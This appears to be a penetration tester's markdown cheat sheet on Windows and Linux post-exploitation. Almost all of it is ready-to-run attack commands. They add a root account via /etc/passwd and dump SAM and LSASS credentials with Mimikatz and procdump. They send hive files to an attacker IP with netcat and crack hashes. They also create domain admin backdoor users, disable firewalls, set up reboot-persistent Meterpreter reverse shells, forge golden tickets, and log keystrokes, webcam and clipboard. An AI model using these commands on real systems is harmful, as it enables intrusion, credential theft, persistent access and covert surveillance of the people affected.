## File Transfer:

## Port Redirection & Tunneling:

## Active Directory:

## Persistence/Credentials:

    Unix:
        Add User:  echo root2:w08rKyoC9ECsg:0:0:/root:/bin/bash >> /etc/passwd     #password
        run post/linux/gather/hashdump

    Windows:
        -Dumping SAM file (older systems)
        pwdump or fgdump: On Meterpreter:  upload /usr/share/windows-binaries/fgdump/fgdump.exe c:\\

        Mimikatz: pull credentials from memory
          in meterpreter:  execute -H -i -c -f /root/Desktop/Mimikatz/x64/mimikatz.exe -m


        Credentials:
            SAM Files:
                Dump (if admin):  reg save hklm\sam c:\sam, reg save hklm\system c:\system,  and transfer back:  nc64.exe 10.10.14.18 4445 < SAMS   ,  nc -nvlp 4445 > SAMS
                Decrypt (Unix):  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM [ip]
                Decrypt (Windows):  mimikatz.exe; privilege::debug; token::elevate; lsadump::sam filename1.hiv filename2.hiv
                Crack:  hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst
            MSF:  run post/windows/gather/hashdump
            Mimikatz:
                Local:  mimikatz.exe; privilege::debug; sekurlsa::logonpasswords full  \\  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
                    In Meterpreter:  load mimikatz; msv  \\  creds_all  \\  kerberos  \\  mimikatz_command -f samdump::hashes  \\  mimikatz_command -f sekurlsa::searchPasswords
                From LSASS dump:
                    from task manager  \\  procdump -ma lsass.exe lsass.dmp  \\  Import-Module .\OutMiniDump.ps1; Get-Process lsass | Out-Minidump (https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1)
                    mimikatz “sekurlsa::minidump C:\Users\username\AppData\Local\Temp\lsass.DMP”; sekurlsa::logonPasswords

        Add User:
            net user <username> <password> /add
            net localgroup Administrators <username> /add

        RDP:
            Enable RDP Access:
                reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
                netsh firewall set service remoteadmin enable
                netsh firewall set service remotedesktop enable
            Add RDP User (Windows):  net user <user> <pass> /add; net localgroup "Administrators" <USER> /add; net localgroup "Remote Desktop Users" <USER> /add


        Turn Off Firewall:
            Newer:  netsh advfirewall set allprofiles state off
            Older:  netsh firewall set opmode disable
        
        
        Windows:
Modules: https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/
PrivEsc:
    getsystem
    use priv
    use post/multi/recon/local_exploit_suggester  ;  use exploit/windows/local/...
Creds:
    hashdump  \\  Better:  run hashdump \ run post/windows/gather/smart_hashdump ->**copy file to /tmp
        john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
        use auxiliary/analyze/jtr_crack_fast
    GPO creds:  use post/windows/gather/credentials/gpp, set ... DOMAINS=BOOT SESSION=#
    run credcollect
    steal_token <PID> / drop_token
	Mimikatz:
		Option 1: load kiwi; creds_all  \\  creds_msv  \\  creds_kerberos   (require System)
		Option 2: load kiwi; kiwi_cmd "privilege::debug"; kiwi_cmd "sekurlsa::logonPasswords full"; kiwi_cmd "sekurlsa::credman"; kiwi_cmd "SEKURLSA::Kerberos"; kiwi_cmd "SEKURLSA::Krbtgt"; kiwi_cmd "SEKURLSA::SSP"; kiwi_cmd "SEKURLSA::Wdigest"
Persistence:
    Add User:  Local: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD","cmd.exe /c net localgroup 'Administrators' metasploit /ADD" ; Domain: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD /DOMAIN","cmd.exe /c net group "Domain Admins" metasploit /ADD /DOMAIN"
        Make Domain Admin:  run multicommand -cl 'cmd.exe /c net group "Domain admins" mossa /add /domain'; run multicommand -cl 'cmd.exe /c net group "Domain admins" /domain'
    RDP:
        run post/windows/manage/enable_rdp username=admin,password=password
            Or: run getgui -e  //  or  run getgui -u loneferret -p password  ;  then cleanup:  ex. run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
    Telnet:  run gettelnet [-e  //  -u user -p pass]
    Meterpreter Bind Backdoor:  run metsvc; use exploit/multi/handler; set PAYLOAD windows/metsvc_bind_tcp; set LPORT 31337; set RHOST 192.168.1.104; run
        Reverse Backdoor (reboot persistent):  run persistence -U -i 5 -p 443 -r 192.168.1.71; use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.71; set LPORT 443; exploit
    Golden Ticket:  load kiwi;  golden_ticket_create -u mossa -d BOOT.LAB -k (krbtgt hash last half only) -s (Domain User SID w/o last 4 digits--from enum_users) -t /tmp/ticket
        kerberos_ticket_list; kerberos_ticket_use /tmp/ticket
Hardware:
    Clipboard:  load extapi; clipboard_get_data; clipboard_monitor_start; clipboard_monitor_dump
    Keylogger:  keyscan_start; keyscan_stop; keyscan_dump  (after migrating to explorer)
    webcam_list \ webcam_snap
    screengrab
    run vnc  -  opens quick viewing session
